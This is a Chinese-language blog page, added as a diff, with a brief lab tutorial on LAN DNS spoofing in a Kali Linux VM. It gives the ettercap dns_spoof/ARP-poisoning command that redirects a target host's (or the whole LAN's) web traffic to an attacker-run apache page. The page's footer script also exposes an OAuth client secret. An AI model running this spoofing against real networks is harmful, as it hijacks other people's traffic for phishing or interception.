@@ -1,0 +1,195 @@
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>Kali Linux实现局域网dns欺骗 | 小 忆 博 客</title>
+    
+        <meta name="keywords" content="XiaoYi Blog, Rcall, 小忆博客" />
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/img/avatar.jpg">
+    <meta name="description" content="实验环境：kali linux虚拟机 所需工具：ettercap＋apache2 目标ip：192.168.252.2 攻击ip：192.168.252.14">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux实现局域网dns欺骗">
+<meta property="og:url" content="https://blog.iiwo.vip/2015/12/19/Kali-Linux实现局域网dns欺骗/index.html">
+<meta property="og:site_name" content="小 忆 博 客">
+<meta property="og:description" content="实验环境：kali linux虚拟机 所需工具：ettercap＋apache2 目标ip：192.168.252.2 攻击ip：192.168.252.14">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://ocm7auxuq.bkt.clouddn.com/g1.png">
+<meta property="og:image" content="http://ocm7auxuq.bkt.clouddn.com/g2.png">
+<meta property="og:image" content="http://ocm7auxuq.bkt.clouddn.com/g3.png">
+<meta property="og:image" content="http://ocm7auxuq.bkt.clouddn.com/g4.png">
+<meta property="og:updated_time" content="2016-08-28T10:22:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kali Linux实现局域网dns欺骗">
+<meta name="twitter:description" content="实验环境：kali linux虚拟机 所需工具：ettercap＋apache2 目标ip：192.168.252.2 攻击ip：192.168.252.14">
+<meta name="twitter:image" content="http://ocm7auxuq.bkt.clouddn.com/g1.png">
+    
+        
+            <link rel="stylesheet" href="//fonts.openapi.link/css?family=Lato:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext">
+        
+            <link rel="stylesheet" href="/css/gitment.css">
+        
+            <link rel="stylesheet" href="/css/hola.css">
+        
+    
+    
+        <script type="text/javascript">
+            (function() {
+                var hm = document.createElement("script");
+                hm.src = "//tajs.qq.com/stats?sId=";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        </script>
+    
+</head>
+<body>
+    <div class="container">
+        <div class="header-outer">
+            <div class="header-site">
+                <div class="header-title">
+                    小 忆 博 客
+                </div>
+                <div id="hitokoto" class="header-subtitle">
+                    有梦想，有精彩
+                </div>
+            </div>
+            <div class="header-menu">
+                
+                    <span class="header-nav">
+                        <a href="/">首页</a>
+                    </span>
+                
+                    <span class="header-nav">
+                        <a href="/about">关于</a>
+                    </span>
+                
+                    <span class="header-nav">
+                        <a href="/links">友链</a>
+                    </span>
+                
+            </div>
+        </div>
+
+        <div id="content-outer">
+            <div id="content-inner">
+                
+
+
+<article class="post">
+    <h1 class="post-title">Kali Linux实现局域网dns欺骗</h1>
+    
+        <h2>目录</h2>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#undefined"><span class="toc-text">1、查找etter.dns并编辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#undefined"><span class="toc-text">2、进行DNS欺骗</span></a></li></ol>
+        <br>
+    
+    <p><font size="5">实验环境：kali linux虚拟机<br></font></p>
+<p>所需工具：ettercap＋apache2<br></p>
+<p>目标ip：192.168.252.2<br></p>
+<p>攻击ip：192.168.252.14<br><a id="more"></a></p>
+<h4>1、查找etter.dns并编辑</h4>
+
+<p><code>root@kali:~# locate etter.dns</code></p>
+<p><code>/etc/ettercap/etter.dns</code></p>
+<p><code>root@kali:~# vim /etc/ettercap/etter.dns</code></p>
+<p><img src="http://ocm7auxuq.bkt.clouddn.com/g1.png" alt="截图"></p>
+<p><img src="http://ocm7auxuq.bkt.clouddn.com/g2.png" alt="截图"></p>
+<h4>2、进行DNS欺骗</h4>
+
+<p><code>root@kali:~# ettercap -T -q -i eth0 -P dns_spoof -M arp //192.168.252.2/ //192.168.252.1/</code></p>
+<p>注：第一个//target ip/中间为待欺骗的IP地址，留空则为当前局域网所有IP,第二个//gateway/中间为网关</p>
+<p><img src="http://ocm7auxuq.bkt.clouddn.com/g3.png" alt="截图"></p>
+<p>这个时候目标主机的访问的网站都被转到了我们的网页上了</p>
+<p><img src="http://ocm7auxuq.bkt.clouddn.com/g4.png" alt="截图"></p>
+<p>注：启动apache2:<br><code>／etc/init.d/apache2 start</code></p>
+
+</article>
+<div class="post-footer">
+    <div class="post-author">
+        <span>创作于 2015年12月19日</span>
+    </div>
+    <div class="post-category">
+        <span>分类于「」
+        </span>
+    </div>
+    <div class="post-tags">
+        
+    </div>
+    
+        <div class="pagination">
+            
+                <div class="nav-next nav-item">
+                        <a href="/2015/11/20/MacBook使用感受/">MacBook使用感受</a>
+                </div>
+            
+            
+                <div class="nav-prev nav-item">
+                        <a href="/2016/01/01/适合做博客背景音乐的源码/">适合做博客背景音乐的源码</a>
+                </div>
+            
+        </div>
+    
+</div>
+<div id="gitment"></div>
+            </div>
+        </div>
+
+        <div class="footer-outer">
+            <div class="footer-author">
+                © 2015 - 2018 小忆
+            </div>
+            <div class="footer-inner">由 <a href="http://hexo.io">Hexo</a> 强力驱动 | 主题 - <a href="https://github.com/isecret/Hola">Hola</a></div>
+        </div>
+    </div>
+    
+        
+            <script src="/js/jquery.min.js"></script>
+        
+            <script src="/js/fetch.min.js"></script>
+        
+            <script src="/js/instantclick.min.js"></script>
+        
+            <script src="/js/gitment.browser.min.js"></script>
+        
+            <script src="/js/hola.js"></script>
+        
+    
+    
+        <script>
+            var gitment = new Gitment({
+                id: window.location.href,
+                owner: "racall",
+                repo: "comment",
+                oauth: {
+                    client_id: "c7d336cf3868196517c0",
+                    client_secret: "a6bee65b0275b51140b2fd203ff90d57e0b00ad5"
+                }
+            });
+            gitment.render("gitment");
+        </script>
+    
+    
+    <script>
+        fetch('https://v1.hitokoto.cn')
+            .then(function (res){
+                return res.json();
+            })
+            .then(function (data) {
+                var hitokoto = document.getElementById('hitokoto');
+                hitokoto.innerText = '「' + data.hitokoto + '」——' + data.from;
+            })
+            .catch(function (err) {
+                console.error(err);
+            });
+    </script>
+    
+    <script data-no-instant>InstantClick.init();</script>
+</body>
+</html>
